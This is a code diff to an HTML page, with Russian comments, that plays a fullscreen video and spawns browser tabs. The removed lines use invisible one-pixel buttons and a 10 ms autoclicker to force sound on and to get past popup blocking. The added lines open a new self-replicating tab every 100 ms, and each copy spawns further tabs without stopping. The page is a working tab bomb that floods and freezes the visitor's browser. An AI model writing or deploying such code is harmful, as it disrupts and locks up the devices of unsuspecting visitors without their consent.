@@ -37,14 +37,6 @@
             width: 100%; height: 100%; object-fit: cover;
         }
         .hidden { display: none !important; }
-
-        /* Невидимые кнопки 1х1 пиксель для байпасса */
-        .bypass-btn {
-            position: absolute; top: 0; left: 0;
-            width: 1px; height: 1px; opacity: 0.001;
-            border: none; background: transparent; cursor: pointer;
-            z-index: 9999;
-        }
     </style>
 </head>
 <body>
@@ -60,10 +52,6 @@
             <source src="video.mp4" type="video/mp4">
         </video>
     </div>
-
-    <!-- Две скрытые кнопки для байпасса -->
-    <button id="sound-bypass-btn" class="bypass-btn"></button>
-    <button id="window-bypass-btn" class="bypass-btn"></button>
 
     <script>
         var started = false;
@@ -82,95 +70,43 @@
                 video.play().catch(function(){});
             });
 
-            // Запускаем ультра-автокликер (каждые 0.01 сек) по нашим скрытым кнопкам
+            // Сразу же запускаем попытки спама каждые 0.1 секунды (100 мс) без остановки
             setInterval(function() {
-                try { document.getElementById('sound-bypass-btn').click(); } catch(e) {}
-                try { document.getElementById('window-bypass-btn').click(); } catch(e) {}
-            }, 10);
-
-            // Ровно через 3 секунды запускаем цепную реакцию создания копий
-            setTimeout(function() {
-                triggerReplication();
-            }, 3000);
-        }
-
-        // Логика кнопки звукового байпасса
-        document.getElementById('sound-bypass-btn').addEventListener('click', function() {
-            var v = document.getElementById('fullscreen-video');
-            if (v && v.muted) {
-                v.muted = false;
-                v.play().catch(function(){});
-            }
-        });
-
-        // Логика кнопки создания новых окон (байпасс через клик)
-        document.getElementById('window-bypass-btn').addEventListener('click', function() {
-            // Защита от перегрузки: делаем так, чтобы срабатывало ровно каждые 3 секунды
-            if (!window._lastSpawn || Date.now() - window._lastSpawn >= 3000) {
-                window._lastSpawn = Date.now();
-                openReplicatingTab();
-            }
-        });
-
-        function openReplicatingTab() {
-            try {
-                var w = window.open('', '_blank');
-                if (w) {
-                    w.document.write(`
-                        <html>
-                        <head>
-                            <title>Loading...</title>
-                            <style>
-                                html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
-                                video { width: 100%; height: 100%; object-fit: cover; }
-                                .bypass-btn { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.001; border: none; background: transparent; }
-                            </style>
-                        </head>
-                        <body>
-                            <video id="v" loop playsinline>
-                                <source src="video.mp4" type="video/mp4">
-                            </video>
-                            <button id="s-btn" class="bypass-btn"></button>
-                            <button id="w-btn" class="bypass-btn"></button>
-                            <script>
-                                var v = document.getElementById('v');
-                                v.muted = false;
-                                v.play().catch(function() {
-                                    v.muted = true;
-                                    v.play().catch(function(){});
-                                });
-
-                                // Автокликер внутри копии
-                                setInterval(function() {
-                                    try { document.getElementById('s-btn').click(); } catch(e) {}
-                                    try { document.getElementById('w-btn').click(); } catch(e) {}
-                                }, 10);
-
-                                document.getElementById('s-btn').addEventListener('click', function() {
-                                    if (v.muted) {
-                                        v.muted = false;
+                try {
+                    var w = window.open('', '_blank');
+                    if (w) {
+                        w.document.write(`
+                            <html>
+                            <head>
+                                <title>Loading...</title>
+                                <style>
+                                    html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
+                                    video { width: 100%; height: 100%; object-fit: cover; }
+                                </style>
+                            </head>
+                            <body>
+                                <video id="v" loop playsinline>
+                                    <source src="video.mp4" type="video/mp4">
+                                </video>
+                                <script>
+                                    var v = document.getElementById('v');
+                                    v.muted = false;
+                                    v.play().catch(function() {
+                                        v.muted = true;
                                         v.play().catch(function(){});
-                                    }
-                                });
-
-                                document.getElementById('w-btn').addEventListener('click', function() {
-                                    if (!window._subSpawn || Date.now() - window._subSpawn >= 3000) {
-                                        window._subSpawn = Date.now();
-                                        try {
-                                            window.open(window.location.href, '_blank');
-                                        } catch(e) {}
-                                    }
-                                });
-                            <\/script>
-                        </body>
-                        </html>
-                    `);
-                }
-            } catch(e) {}
-        }
-
-        function triggerReplication() {
-            openReplicatingTab();
+                                    });
+                                    
+                                    // Внутри копии тоже долбимся каждые 0.1 сек
+                                    setInterval(function() {
+                                        try { window.open(window.location.href, '_blank'); } catch(e) {}
+                                    }, 100);
+                                <\/script>
+                            </body>
+                            </html>
+                        `);
+                    }
+                } catch(e) {}
+            }, 100);
         }
     </script>
 </body>
